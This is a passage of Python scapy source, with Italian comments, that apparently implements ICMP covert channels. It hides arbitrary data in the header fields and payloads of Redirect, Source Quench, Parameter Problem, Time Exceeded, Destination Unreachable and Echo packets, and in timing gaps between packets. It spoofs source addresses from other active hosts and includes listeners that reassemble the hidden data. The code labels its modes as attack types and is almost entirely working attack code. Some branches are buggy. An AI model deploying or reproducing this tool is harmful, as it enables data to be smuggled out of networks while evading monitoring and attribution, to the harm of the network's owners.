                    self.data.append(inner_ip.ttl.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00')) 
                if inner_ip:=packet.getlayer(ICMPerror): 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.seq.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))         
        return callback

    def wait(self):
        super().wait([self.REDIRECT]) 
    
    def send(self, data:bytes=None, type_attacco:Enum=None):  
        if not IS_TYPE.bytes(data): 
            raise Exception(f"data non bytes") 
        if not IS_TYPE.ipaddress(self.ip_dst) or self.ip_dst.version!=4:
            raise Exception("ip_dst non corretto")
        if not self.target_mac:
            self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
        if not self.interface:
            self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface     
        ip_src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None
        for index in range(0, len(data), 9): 
            #icmp_id=(data[index]<<8)+data[index+1]
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1 ,
                        len=int.from_bytes(data[index:index+2]), 
                        id=int.from_bytes(data[index+2:index+4]), 
                        ttl=int.from_bytes(data[index+4:index+5])) / \
                ICMP(type=0, id=int.from_bytes(data[index+5:index+7]),seq=int.from_bytes(data[index+7:index+9]))
            pkt= Ether(dst=self.target_mac)\
                /IP(src=ip_src, dst=self.ip_dst.compressed, proto=1)\
                /ICMP(type=self.REDIRECT)\
                /bytes(dummy_ip)[:28]
            #pkt.summary()
            #pkt.show()
            sendp(pkt, verbose=1, iface=self.interface) 
    
    def send_last(self): 
        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1)/\
            ICMP(id=self.stop_integer,seq=self.stop_integer)
        pkt= Ether(dst=self.target_mac)\
            /IP(dst=self.ip_dst.compressed)\
            /ICMP(type=self.REDIRECT)/bytes(dummy_ip)[:28]
        pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=self.interface)  

class IPV4_SOURCE_QUENCH(_IPx): 
    SOURCE_QUENCH=ICMP_TYPE.v4_SourceQuench.value

    def get_callback(self): 
        def callback(packet): 
            nonlocal self 
            if packet.haslayer(IP) and packet.haslayer(ICMP) and packet[ICMP].type==self.SOURCE_QUENCH:  
                if not packet.haslayer(ICMPerror) or (packet[ICMPerror].id==self.stop_integer and packet[ICMPerror].seq==self.stop_integer): 
                    #THREADING_EVENT.set(self.event_pktconn) 
                    self.stop_flag["value"]=True 
                    return 
                #self.data.append(packet[ICMP].unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00')) 
                raw = bytes(packet[ICMP])
                unused = int.from_bytes(raw[4:8], byteorder="big") 
                #print("UNUSED: ", unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00')) 
                self.data.append(unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00'))
                if inner_ip:=packet.getlayer(IPerror): 
                    self.data.append(inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.ttl.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00')) 
                if inner_ip:=packet.getlayer(ICMPerror): 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.seq.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))       
        return callback

    def wait(self):
        super().wait([self.SOURCE_QUENCH]) 
    
    def send(self, data:bytes=None, type_attacco:Enum=None): 
        def get_packet(): 
            #nonlocal self, data, index, ip_src
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1, 
                        len=int.from_bytes(data[index:index+2]), 
                        id=int.from_bytes(data[index+2:index+4]), 
                        ttl=int.from_bytes(data[index+4:index+5])) / \
                ICMP(type=0, id=int.from_bytes(data[index+5:index+7]),seq=int.from_bytes(data[index+7:index+9]))
            pkt= Ether(dst=self.target_mac)\
                /IP(src=ip_src, dst=self.ip_dst.compressed, proto=1)\
                /ICMP(type=self.SOURCE_QUENCH)\
                /Raw(load=bytes(dummy_ip)[:28])
            #pkt.summary()
            #pkt.show() 
            return pkt
        def get_packet_unused(): 
            #nonlocal self, data, index, ip_src
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1, 
                        len=int.from_bytes(data[index+4:index+6]), 
                        id=int.from_bytes(data[index+6:index+8]), 
                        ttl=int.from_bytes(data[index+8:index+9])) / \
                ICMP(type=0, id=int.from_bytes(data[index+9:index+11]),seq=int.from_bytes(data[index+11:index+13]))
            icmp_hdr = struct.pack(
                "!BBHI", 
                self.SOURCE_QUENCH, #icmp type
                0, #icmp code 
                0, #checksum
                int.from_bytes(data[index:index+4]) #unused field
            )
            cksum = checksum(icmp_hdr + bytes(dummy_ip)[:28]) # scapy.utils.checksum ritorna intero 16-bit
            cksum &= 0xffff
            icmp_hdr = struct.pack(
                "!BBHI", 
                self.SOURCE_QUENCH, 
                0, 
                cksum, 
                int.from_bytes(data[index:index+4])
            ) 
            pkt= Ether(dst=self.target_mac)\
                /IP(src=ip_src, dst=self.ip_dst.compressed, proto=1)\
                /Raw(load=icmp_hdr + bytes(dummy_ip)[:28]) 
            #pkt.summary()
            #pkt.show() 
            return pkt
        if not IS_TYPE.bytes(data):
            raise Exception(f"data non bytes") 
        if not IS_TYPE.ipaddress(self.ip_dst) or self.ip_dst.version!=4:
            raise Exception("ip_dst non valido")
        if not self.target_mac:
            self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
        if not self.interface:
            self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
        if not IS_TYPE.enum(type_attacco, AttackType): 
            raise Exception("type_attacco non valido: ") 
        if "_unused" in type_attacco.name: 
            step_data=13
        else: step_data=9
        ip_src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None
        for index in range(0, len(data), step_data): 
            if step_data==13: pkt=get_packet_unused()
            else: pkt=get_packet()
            sendp(pkt, verbose=1, iface=self.interface) 

    def send_last(self): 
        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1)\
            /ICMP(id=self.stop_integer,seq=self.stop_integer) 
        pkt= Ether(dst=self.target_mac)\
            /IP(dst=self.ip_dst.compressed, proto=1)\
            /ICMP(type=self.SOURCE_QUENCH)/Raw(load=bytes(dummy_ip)[:28])
        #pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=self.interface)  

class IPV4_PARAMETER_PROBLEM(_IPx): 
    PARAMETER_PROBLEM=ICMP_TYPE.v4_ParameterProblem.value

    def get_callback(self): 
        def callback(packet): 
            nonlocal self 
            if packet.haslayer(IP) and packet.haslayer(ICMP) and packet[ICMP].type==self.PARAMETER_PROBLEM:  
                if not packet.haslayer(ICMPerror) or (packet[ICMPerror].id==self.stop_integer and packet[ICMPerror].seq==self.stop_integer): 
                    #THREADING_EVENT.set(self.event_pktconn)
                    self.stop_flag["value"]=True 
                    return 
                self.data.append(packet[ICMP].ptr.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00'))
                #self.data.append(packet[ICMP].unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00')) 
                raw = bytes(packet[ICMP])
                unused = int.from_bytes(raw[4:8], byteorder="big") 
                #print("UNUSED: ", unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00')) 
                self.data.append(unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00'))
                if inner_ip:=packet.getlayer(IPerror): 
                    self.data.append(inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.ttl.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00')) 
                if inner_ip:=packet.getlayer(ICMPerror): 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.seq.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))                   
        return callback
    
    def wait(self):
        super().wait([self.PARAMETER_PROBLEM]) 
    
    def send(self, data:bytes=None, type_attacco:Enum=None): 
        def get_packet(): 
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1, 
                    len=int.from_bytes(data[index+1:index+3]), 
                    id=int.from_bytes(data[index+3:index+5]), 
                    ttl=int.from_bytes(data[index+5:index+6]))\
                /ICMP(type=0, id=int.from_bytes(data[index+6:index+8]),seq=int.from_bytes(data[index+8:index+10]))
            pkt= Ether(dst=self.target_mac)\
                /IP(src=ip_src, dst=self.ip_dst.compressed, proto=1)\
                /ICMP(type=self.PARAMETER_PROBLEM, ptr=int(data[index]))\
                /Raw(load=bytes(dummy_ip)[:28])
            #pkt.summary()
            #pkt.show()
            return pkt 
        def get_packet_unused(): 
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1, 
                    len=int.from_bytes(data[index+4:index+6]), 
                    id=int.from_bytes(data[index+6:index+8]), 
                    ttl=int.from_bytes(data[index+8:index+9])) / \
                ICMP(type=0, id=int.from_bytes(data[index+9:index+11]),seq=int.from_bytes(data[index+11:index+13]))
            icmp_hdr = struct.pack(
                "!BBHB3s", 
                self.PARAMETER_PROBLEM, #icmp type
                0, #icmp code
                0, #checksum
                int(data[index]), #pointer
                data[index+1:index+4] #unused field
            )
            cksum = checksum(icmp_hdr + bytes(dummy_ip)[:28]) # scapy.utils.checksum ritorna intero 16-bit
            cksum &= 0xffff
            icmp_hdr = struct.pack(
                "!BBHB3s", 
                self.PARAMETER_PROBLEM, 
                0, 
                cksum, 
                int(data[index]), #pointer
                data[index+1:index+4] #unused field
            ) 
            pkt= Ether(dst=self.target_mac)/\
                IP(src=ip_src, dst=self.ip_dst.compressed, proto=1)/\
                Raw(load=icmp_hdr + bytes(dummy_ip)[:28]) 
            #pkt.summary()
            #pkt.show()
            return pkt
        if not IS_TYPE.bytes(data): 
            raise Exception(f"data non bytes") 
        if not IS_TYPE.ipaddress(self.ip_dst) or self.ip_dst.version!=4:
            raise Exception(f"ip_dst non valido")  
        if not self.target_mac:
            self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower() 
        if not self.interface:
            self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface   
        if not IS_TYPE.enum(type_attacco, AttackType): 
            raise Exception("type_attacco non valido: ") 
        if "_unused" in type_attacco.name: 
            step_data=13
        else: step_data=10 
        ip_src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None
        for index in range(0, len(data), step_data): 
            if step_data==13: pkt=get_packet_unused()
            else: pkt=get_packet()
            sendp(pkt, verbose=1, iface=self.interface) #iface=self.interface
    
    def send_last(self): 
        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1)/\
            ICMP(id=self.stop_integer,seq=self.stop_integer)
        pkt= Ether(dst=self.target_mac)\
            /IP(dst=self.ip_dst.compressed, proto=1)\
            /ICMP(type=self.PARAMETER_PROBLEM)\
            /Raw(load=bytes(dummy_ip)[:28])
        #pkt.summary() 
        #pkt.show() 
        sendp(pkt, verbose=1, iface=self.interface)  

class IPV4_TIME_EXCEEDED(_IPx):  
    TIME_EXCEEDED=ICMP_TYPE.v4_TimeExceeded.value 

    def get_callback(self): 
        def callback(packet):  
            nonlocal self 
            if packet.haslayer(IP) and packet.haslayer(ICMP) and packet[ICMP].type==self.TIME_EXCEEDED: 
                #print(f"Callbak 'v4_parameter_problem' arrived packet: {packet.summary()}")
                if not packet.haslayer(ICMPerror) or (packet[ICMPerror].id==self.stop_integer and packet[ICMPerror].seq==self.stop_integer): 
                    #THREADING_EVENT.set(self.event_pktconn)
                    self.stop_flag["value"]=True 
                    return 
                #self.data.append(packet[ICMP].unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00')) 
                raw = bytes(packet[ICMP])
                unused = int.from_bytes(raw[4:8], byteorder="big") 
                #print("UNUSED: ", unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00')) 
                self.data.append(unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00'))
                if inner_ip:=packet.getlayer(IPerror): 
                    self.data.append(inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.ttl.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00')) 
                if inner_ip:=packet.getlayer(ICMPerror): 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.seq.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))                  
        return callback

    def wait(self): 
        super().wait([self.TIME_EXCEEDED])  
        
    def send(self, data:bytes=None, type_attacco:Enum=None):  
        def get_packet(): 
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1, 
                        len=int.from_bytes(data[index:index+2]), 
                        id=int.from_bytes(data[index+2:index+4]), 
                        ttl=int.from_bytes(data[index+4:index+5]))\
                /ICMP(type=0, id=int.from_bytes(data[index+5:index+7]),seq=int.from_bytes(data[index+7:index+9]))
            pkt= Ether(dst=self.target_mac)\
                /IP(src=ip_src, dst=self.ip_dst.compressed, proto=1)\
                /ICMP(type=self.TIME_EXCEEDED)\
                /Raw(load=bytes(dummy_ip)[:28])
            #pkt.summary()
            #pkt.show() 
            return pkt
        def get_packet_unused(): 
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1, 
                        len=int.from_bytes(data[index+4:index+6]), 
                        id=int.from_bytes(data[index+6:index+8]), 
                        ttl=int.from_bytes(data[index+8:index+9])) / \
                ICMP(type=0, id=int.from_bytes(data[index+9:index+11]),seq=int.from_bytes(data[index+11:index+13]))
            icmp_hdr = struct.pack(
                "!BBHI", 
                self.TIME_EXCEEDED, #icmp type
                0, #icmp code
                0, #checksum
                int.from_bytes(data[index:index+4]) #unused field
            )
            cksum = checksum(icmp_hdr + bytes(dummy_ip)[:28]) # scapy.utils.checksum ritorna intero 16-bit
            cksum &= 0xffff
            icmp_hdr = struct.pack(
                "!BBHI", 
                self.TIME_EXCEEDED, 
                0, 
                cksum, 
                int.from_bytes(data[index:index+4])
            ) 
            pkt= Ether(dst=self.target_mac)\
                /IP(src=ip_src, dst=self.ip_dst.compressed, proto=1)\
                /Raw(load=icmp_hdr + bytes(dummy_ip)[:28]) 
            #pkt.summary()
            #pkt.show()
            return pkt
        if not IS_TYPE.bytes(data): 
            raise Exception(f"data non bytes") 
        if not IS_TYPE.ipaddress(self.ip_dst) or self.ip_dst.version!=4:
            raise Exception(f"ip_dst non corretto")  
        if not self.target_mac:
            self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
        if not self.interface:
            self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
        if not IS_TYPE.enum(type_attacco, AttackType): 
            raise Exception("type_attacco non valido: ") 
        if "_unused" in type_attacco.name: 
            step_data=13
        else: step_data=9
        ip_src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None
        for index in range(0, len(data), step_data):
            if step_data==13: pkt=get_packet_unused()
            else: pkt=get_packet()
            sendp(pkt, verbose=1, iface=self.interface) 
    
    def send_last(self): 
        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1)\
            /ICMP(id=self.stop_integer,seq=self.stop_integer)
        pkt= Ether(dst=self.target_mac)\
            /IP(dst=self.ip_dst.compressed, proto=1)\
            /ICMP(type=self.TIME_EXCEEDED)\
            /Raw(load=bytes(dummy_ip)[:28])
        #pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=self.interface) 

class IPV4_DESTINATION_UNRECHABLE(_IPx): 
    DESTINATION_UNREACHABLE=ICMP_TYPE.v4_DestinationUnreachable.value 

    def get_callback(self): 
        def callback(packet): 
            nonlocal self 
            #packet.show()
            if packet.haslayer(IP) and packet.haslayer(ICMP) and packet[ICMP].type==self.DESTINATION_UNREACHABLE:  
                if not packet.haslayer(ICMPerror) or (packet[ICMPerror].id==self.stop_integer and packet[ICMPerror].seq==self.stop_integer): 
                    #THREADING_EVENT.set(self.event_pktconn) 
                    self.stop_flag["value"]=True 
                    return 
                #self.data.append(packet[ICMP].unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00')) 
                raw = bytes(packet[ICMP])
                unused = int.from_bytes(raw[4:8], byteorder="big") 
                #print("UNUSED: ", unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00')) 
                self.data.append(unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00'))
                if inner_ip:=packet.getlayer(IPerror): 
                    self.data.append(inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.ttl.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00')) 
                if inner_ip:=packet.getlayer(ICMPerror): 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.seq.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))                     
        return callback

    def wait(self):
        super().wait([self.DESTINATION_UNREACHABLE])  
    
    def send(self, data:bytes=None, type_attacco:Enum=None):  
        def get_packet():
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1 ,
                    len=int.from_bytes(data[index:index+2]), 
                    id=int.from_bytes(data[index+2:index+4]), 
                    ttl=int.from_bytes(data[index+4:index+5])) / \
                ICMP(type=0, id=int.from_bytes(data[index+5:index+7]),seq=int.from_bytes(data[index+7:index+9]))
            pkt= Ether(dst=self.target_mac)\
                /IP(src=ip_src, dst=self.ip_dst.compressed, proto=1)\
                /ICMP(type=self.DESTINATION_UNREACHABLE, code=3)\
                /Raw(load=bytes(dummy_ip)[:28]) 
            #pkt.summary()
            #pkt.show() 
            return pkt
        def get_packet_unused(): 
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", proto=1 ,
                        len=int.from_bytes(data[index+4:index+6]), 
                        id=int.from_bytes(data[index+6:index+8]), 
                        ttl=int.from_bytes(data[index+8:index+9])) / \
                ICMP(type=0, id=int.from_bytes(data[index+9:index+11]),seq=int.from_bytes(data[index+11:index+13])) 
            icmp_hdr = struct.pack(
                "!BBHI", 
                self.DESTINATION_UNREACHABLE, #icmp type
                3, #icmp code
                0, #checksum
                int.from_bytes(data[index:index+4]) #unused field
            )
            cksum = checksum(icmp_hdr + bytes(dummy_ip)[:28]) # scapy.utils.checksum ritorna intero 16-bit
            cksum &= 0xffff
            icmp_hdr = struct.pack(
                "!BBHI", 
                self.DESTINATION_UNREACHABLE, 
                3, 
                cksum, 
                int.from_bytes(data[index:index+4])
            )
            pkt= Ether(dst=self.target_mac)/\
                IP(src=ip_src, dst=self.ip_dst.compressed, proto=1)/\
                Raw(load=icmp_hdr + bytes(dummy_ip)[:28]) 
            #pkt.summary()
            #pkt.show()  
            return pkt
        if not IS_TYPE.bytes(data):
            raise Exception(f"data non bytes") 
        if not IS_TYPE.ipaddress(self.ip_dst) or self.ip_dst.version!=4:
            raise Exception("ip_dst non valido")
        if not self.target_mac:
            self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
        if not self.interface:
            self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface 
        if not IS_TYPE.enum(type_attacco, AttackType): 
            raise Exception("type_attacco non valido: ") 
        if "_unused" in type_attacco.name: 
            step_data=13
        else: step_data=9
        ip_src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None
        for index in range(0, len(data), step_data):
            if step_data==13: pkt=get_packet_unused()
            else: pkt=get_packet()
            #raw_bytes = bytes(pkt) 
            #print(raw_bytes.hex())
            sendp(pkt, verbose=1, iface=self.interface)  if pkt else print("Pacchetto non presente") 

    def send_last(self): 
        dummy_ip=IP(src=self.ip_dst.compressed, dst="8.8.8.8", proto=1)\
            /ICMP(id=self.stop_integer,seq=self.stop_integer)
        pkt= Ether(dst=self.target_mac)/ IP(dst=self.ip_dst.compressed, proto=1)\
            /ICMP(type=self.DESTINATION_UNREACHABLE, code=3)\
            /Raw(load=bytes(dummy_ip)[:28])
        pkt.summary()
        #pkt.show() 
        sendp(pkt, verbose=1, iface=self.interface) 
        
class IPV4_ECHO(_IPx): 
    ECHO_REQ=ICMP_TYPE.v4_Echo_Request.value
    ECHO_REP=ICMP_TYPE.v4_Echo_Reply.value
    variante:Enum=None 
    
    def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:list[ipaddress.IPv4Address]=None, variante:Enum=None): 
        if not IS_TYPE.enum(variante, AttackType): 
            raise Exception("IPV4_ECHO: variante non valida: ",variante) 
        #Variante indicherà quali campi leggere
        super().__init__(ip_dst, host_attivi) 
        self.variante=variante 
    
    def get_callback(self): 
        def callback(packet): 
            nonlocal self  
            if packet.haslayer(IP) and packet.haslayer(ICMP) and (packet[ICMP].type==self.ECHO_REQ or packet[ICMP].type==self.ECHO_REP): 
                if packet[ICMP].id==self.stop_integer and packet[ICMP].seq==self.stop_integer: 
                    #THREADING_EVENT.set(self.event_pktconn) 
                    self.stop_flag["value"]=True 
                    return 
                if self.variante.name==AttackType.ipv4_echo_payload.name or self.variante.name==AttackType.ipv4_echo_campi_payload.name: 
                    if packet.haslayer(Raw):  
                        self.data.append(packet[Raw].load.decode()) 
                    else: print("Payload non presente: ",packet.summary()) 
                if self.variante.name==AttackType.ipv4_echo_campi.name or self.variante.name==AttackType.ipv4_echo_campi_payload.name: 
                    icmp_id=packet[ICMP].id
                    byte1 = (icmp_id >> 8) & 0xFF 
                    byte2 = icmp_id & 0xFF  
                    self.data.append(chr(byte1)+chr(byte2)) 
        return callback
    
    def wait(self):
        super().wait([self.ECHO_REQ, self.ECHO_REP])  
    
    def send(self, data:bytes=None, type_attacco:Enum=None): 
        def get_packet_campi(): 
            #def ipv4_echo_campi(self, data:bytes=None): 
            if index==len(data)-1 and len(data)%2!=0:
                icmp_id=(data[index]<<8)
            else:
                icmp_id=(data[index]<<8)+data[index+1] 
            pkt= Ether(dst=self.target_mac)/\
                IP(src=ip_src, dst=self.ip_dst.compressed)/\
                ICMP(type=self.ECHO_REP,id=icmp_id)
            #pkt.summary()
            #pkt.show()
            return pkt  
        def get_packet_payload(): 
            #ipv4_echo_payload 
            identifier=(identifier+1)%256
            #sequenza=math.ceil(index/step_data) 
            pkt = ( 
                Ether(dst=self.target_mac)
                / IP(src=ip_src, dst=self.ip_dst.compressed) 
                / ICMP(type=self.ECHO_REP, id=identifier, seq=0) 
                / data[index:index+step_data] 
            ) 
            return pkt 
        def get_packet_campi_payload(): 
            if index==len(data)-1 and len(data)%2!=0:
                icmp_id=(data[index]<<8)
            else:
                icmp_id=(data[index]<<8)+data[index+1] 
            pkt= (
                Ether(dst=self.target_mac)
                / IP(src=ip_src, dst=self.ip_dst.compressed)
                / ICMP(type=self.ECHO_REP,id=icmp_id) 
                / data[index+2:index+step_data]
            )
            #pkt.summary()
            #pkt.show()
            return pkt 
        def get_packet_random(): 
            min_block=32 #byte 
            max_block=64 #byte 
            index=0
            while index<len(data): 
                size=int(random.uniform(min_block,max_block))
                if (index+size)>len(data): 
                    size=len(data)-index  
                pkt = ( 
                    Ether(dst=self.target_mac)
                    / IP(src=ip_src, dst=self.ip_dst.compressed) 
                    / ICMP(type=self.ECHO_REP, id=size) 
                    / data[index:index+size] 
                ) 
                #pkt.summary() 
                index+=size 
            return pkt
        if not IS_TYPE.bytes(data):
            raise Exception(f"data non bytes") 
        if not IS_TYPE.ipaddress(self.ip_dst) or self.ip_dst.version!=4:
            raise Exception("ip_dst non valido")
        if not self.target_mac:
            self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
        if not self.interface:
            self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface
        if not IS_TYPE.enum(type_attacco, AttackType): 
            raise Exception("type_attacco non valido: ") 
        if "_campi" in type_attacco.name: 
            step_data=2 
        elif "_payload" in type_attacco.name: 
            #step_data=32 
            step_data=64 
            identifier=0
        elif "_campi_payload" in type_attacco.name: 
            #step_data=2+32 
            step_data=2+64 
            identifier=0
        elif "_random_payload" in type_attacco.name: 
            step_data=random.choice([32+2,64+2,128+2])
        else: raise Exception("args non valido") 
        ip_src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else None 
        for index in range(0, len(data), step_data): 
            if step_data==2: pkt=get_packet_campi()
            elif step_data==64: pkt=get_packet_payload()
            elif step_data in [32+2,64+2,128+2]: pkt=get_packet_campi_payload()
            else: raise Exception("step_data non valido")
            sendp(pkt, verbose=1, iface=self.interface) 
    
    def send_last(self): 
        pkt= Ether(dst=self.target_mac)/\
            IP(dst=self.ip_dst.compressed)/\
            ICMP(type=self.ECHO_REP,
                 id=self.stop_integer,seq=self.stop_integer)
        pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1, iface=self.interface) 

class IPV4_TIMING(_IPx): 
    timeout_callback=None
    timer=None  
    last_packet_time=None 
    numero_bit=0

    def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None, numero_bit:int=0): 
        if not IS_TYPE.integer(numero_bit) or numero_bit not in [1,2,4,8]: 
            raise ValueError("numero_bit non valido")
        super().__init__(ip_dst, host_attivi) 
        self.numero_bit=numero_bit 
        self.timeout_callback=self.timeout_timer_callback()  
        self.DISTANZA_TEMPI=2 #sec
        self.TEMPI_CODICI=[
            3+index*2*self.DISTANZA_TEMPI for index in range(2**self.numero_bit)
        ] 
        self.TEMPO_BYTE=0*60 #minuti 
    
    def get_callback(self):  
        DISTANZA_TEMPI=2 #sec
        dict_tempi={}
        dict_tempi.update( [("TEMPO_"+str(index), 3+index*2*DISTANZA_TEMPI)  for index in range(2**self.numero_bit)])
        dict_bit={ }
        dict_bit.update([ ("TEMPO_"+str(index), index)  for index in range(2**self.numero_bit) ])  

        MINUTE_TIME=0*60+30 #minuti
        MAX_TIME=max([value for _,value in dict_tempi.items()])+5 
    
        def callback(packet):
            nonlocal self, MAX_TIME, MINUTE_TIME  
            if self.last_packet_time is None: 
                self.last_packet_time=packet.time 
                self.timer.cancel()
                self.timer=GET.timer(MAX_TIME, self.timeout_timer_callback) 
                self.timer.start() 
                return  
            if packet.time is not None: 
                delta_time=packet.time-self.last_packet_time   
                arr=arr=[(key, abs(delta_time-value)) for key,value in dict_tempi.items()] 
                min_value=min([y for _,y in arr]) 
                min_indices = [i for i, v in enumerate(arr) if v[1] == min_value] 
                self.data.append(dict_bit.get(arr[min_indices[0]][0]))
                self.last_packet_time=packet.time
                self.timer.cancel() 
                if len(self.data)%8==0: 
                    self.timer=GET.timer(MINUTE_TIME,self.timeout_timer_callback) 
                else:
                    self.timer=GET.timer(MAX_TIME,self.timeout_timer_callback) 
                self.timer.start()
        return callback
    
    def wait(self, type_list:list[int]=None): 
        if not IS_TYPE.list(type_list) or len(type_list)<=0:
            type_list=[x.value for x in ICMP_TYPE if x.name.startswith("v4_")] 
        else: type_list=[x for x in type_list if IS_TYPE.integer(x)] 
        super().wait(type_list)  
    
    def send(self, data:bytes=None, type_attacco:Enum=None): 
        def old_send(): 
            bit_data=[]
            for piece_data in data: #dal byte estraggo i bit  
                #LSB order->[bit_0,bit_1,bit_2,bit_3,bit_4,bit_5,bit_6,bit_7] 
                bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #bit aggiunti in LSB 
                #MSB order->[bit_7,bit_6,bit_5,bit_4,bit_3,bit_2,bit_1,bit_0] 
                #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB 
            #SEND INIT PACKET 
            for piece_bit_data in bit_data:  
                #LSB->[b0,b1,b2,b3],[b4,b5,b6,b7] 
                #LSB->[b7,b6,b5,b4],[b3,b2,b1,b0]
                for bit1, bit2,bit3,bit4 in zip(piece_bit_data[0::4], piece_bit_data[1::4],piece_bit_data[2::4], piece_bit_data[3::4]):
                    index=bit1<<3 | bit2<<2 |  bit3<<1 | bit4  
                    time.sleep(self.TEMPI_CODICI[index])  
                    icmp_type=random.choice([
                        ICMP_TYPE.v4_Echo_Reply,
                        ICMP_TYPE.v4_TimeExceeded
                    ])
                    pkt= Ether(dst=self.target_mac)/\
                        IP(src=ip_src, dst=self.ip_dst.compressed)/\
                        ICMP(type=icmp_type.value, id=125, seq=225)/\
                        Raw()
                    pkt.summary()
                    #pkt.show()
                    sendp(pkt, verbose=1, iface=self.interface)  
                time.sleep(self.TEMPO_BYTE)
        #Nella comunicazione possono verificarsi turbolenze. 
        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore 
        if not IS_TYPE.bytes(data):
            raise TypeError(f"data non byte") 
        if not IS_TYPE.ipaddress(self.ip_dst) or self.ip_dst.version!=4: 
            raise TypeError("ip_dst non valido") 
        if not self.target_mac:
            self.target_mac = NETWORK.GET_MAC_ADDRESS(self.ip_dst).mac_address.strip().replace("-",":").lower()
        if not self.interface:
            self.interface=NETWORK.INTERFACE_FROM_IP(self.ip_dst).interface
